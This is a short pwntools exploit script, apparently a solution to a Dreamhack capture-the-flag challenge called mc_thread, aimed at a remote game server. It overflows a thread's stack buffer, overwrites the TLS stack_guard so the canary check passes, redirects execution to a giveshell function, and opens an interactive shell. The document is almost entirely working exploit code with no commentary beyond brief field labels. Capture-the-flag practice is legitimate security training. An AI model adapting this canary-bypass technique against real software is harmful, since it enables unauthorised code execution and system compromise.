#!/usr/bin/env python3

from pwn import *

exe = ELF("./mc_thread_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host3.dreamhack.games", 8519)

    return r


def main():
    r = conn()

    payload = b"A" * 0x108                          # buf
    payload += b"canary!!"                          # canary
    payload += b"A" * 0x8                           # rbp
    payload += p64(exe.symbols["giveshell"])        # giveshell
    payload += b"A" * (0x910 - len(payload))        # padding
    payload += p64(0x404c00 - 0x972)                # header.self
    payload += b"A" * (0x928 - len(payload))        # padding
    payload += b"canary!!"                          # header.stack_guard

    r.sendlineafter(b"Size: ", str(len(payload) // 8).encode())

    r.sendafter(b"Data: ", payload)

    r.interactive()


if __name__ == "__main__":
    main()
